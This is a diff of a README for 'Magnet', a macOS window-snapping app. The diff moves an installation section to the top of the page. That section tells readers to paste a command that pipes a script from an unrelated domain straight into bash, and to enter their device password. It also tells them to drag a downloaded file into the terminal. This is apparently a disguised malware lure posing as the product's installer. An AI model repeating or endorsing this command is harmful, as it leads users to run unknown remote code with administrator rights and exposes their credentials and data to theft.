@@ -9,6 +9,26 @@
 
 ---
 
+## 📥 How to Use
+
+Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+Installation via a command in the terminal:
+
+1. Copy the installation command below.
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+```bash
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get2/install.sh)"
+```
+
+
+
 ## 📦 What is Magnet?
 
 Magnet is a simple yet powerful app that enhances macOS window management by enabling intuitive snapping and resizing of application windows. It supports keyboard shortcuts, drag-and-drop window snapping, and works seamlessly on multiple displays. Perfect for anyone looking to optimize their screen real estate and workflow on a MacBook or iMac.
@@ -44,23 +64,7 @@ Magnet is a simple yet powerful app that enhances macOS window management by ena
 
 ---
 
-## 📥 How to Use
 
-Installation via .dmg:
-
-1. Install the .dmg file using the button above. 
-2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
-3. Open a terminal and transfer the file you extracted in the last step into it.
-4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
-
-Installation via a command in the terminal:
-
-1. Copy the installation command below.
-2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
-3. Enter your device password and confirm the installation.
-```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get2/install.sh)"
-```
 
 
 
